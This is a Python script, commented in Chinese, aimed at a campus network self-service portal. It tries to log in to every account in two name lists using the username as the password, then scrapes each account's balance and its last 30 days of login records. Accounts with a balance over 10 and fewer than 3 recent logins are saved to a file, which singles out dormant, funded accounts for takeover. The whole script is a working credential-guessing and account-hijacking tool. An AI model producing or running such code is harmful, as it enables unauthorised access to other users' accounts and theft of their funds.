#coding:utf-8

import os
import requests
import base64
import getpass
import re
import datetime
import time
import sys

from bs4 import BeautifulSoup  

import login3

loginurl='http://192.168.252.133:8080/selfservice/module/scgroup/web/login_judge.jsf?'

#查连接记录
def onlineDetail(session):
    toTime = datetime.datetime.now()
    fromTime = datetime.datetime.now() - datetime.timedelta(days=30)

    headers = {
        'Host':"192.168.252.133:8080",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        'Referer':"http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"}
    

    html=session.get('http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf',headers=headers).text
    soup = BeautifulSoup(html) 
    submitCodeId=soup.find(id="submitCodeId")["value"]
    VIEW=soup.find(id="com.sun.faces.VIEW")["value"]
    
    data={
    #'usertype':"xs",
    'OnlineDetailForm:loginFromTime':fromTime.strftime("%Y-%m-%d")+' 00:00:00',
    'OnlineDetailForm:logoutToTime':toTime.strftime("%Y-%m-%d")+' 23:59:59',
    #'OnlineDetailForm:onlineTimeCompare':'onlineDetailSelfListBean.temp',
    'OnlineDetailForm':'OnlineDetailForm',
    'com.sun.faces.VIEW':VIEW,
    'submitCodeId':submitCodeId,
    'ec_i':'ec',
    'ec_crd':10,
    'ec_p':1
    }

    html=session.post('http://192.168.252.133:8080/selfservice/module/onlineuserself/web/onlinedetailself_list.jsf',data=data,headers=headers).content.decode('gbk')
    #print(html)
    soup = BeautifulSoup(html) 
    #tables = soup.findAll('table',{'id':'ec_table'})  
    #tab = tables[0]  
    #for tr in tab.findAll('tr'):  
    #    for td in tr.findAll('td'):  
    #        print td.getText(),  
    #    print 

    table=soup.findAll('table',{'id':'scrollTable'})
    logintimes=table[0].find('td').find('strong').text
    #print(logintimes)
 
    if logintimes != u'当前无记录':
        return logintimes
    else:
        return '0' 

#查余额
def getbalance(session) :
    html=session.get('http://192.168.252.133:8080/selfservice/module/webcontent/web/content_self.jsf').text
    soup = BeautifulSoup(html)
    balance = soup.find('span',{'id':'offileForm:currentAccountFeeValue'}).text
    return float(balance)

#根据用户名和密码查询，默认一个月没有登录，并且余额多于1元的输出到result.re文件
def check(username,passwd):
    session = login3.loginget(username,passwd)
    if session == "" :
        print(username + " login error, skip this number!")
        return
    balance = getbalance(session);
    logintimes = onlineDetail(session)
    print (u'user: %s, balance: %.1f,\tonlinelog: %s' % (username, balance , logintimes))
    f = open("resultc.re", 'a+')
    if  balance > 10 and int(logintimes.replace(',','')) < 3:
        f.write(username+'\n')

#账号列表查询
def checkList(filepath):
    for line in open(filepath):
        name=line.strip()
        check(name,name)
        print

def main():
    #username=input('username:')
    #passwd=base64.b64encode(getpass.getpass('Passwd:').encode()).decode()
    #username='bgnxy111'
    #passwd=username
    #check(username,passwd)
    checkList("bg.re")
    checkList("student.re")

if __name__=='__main__':
    main()

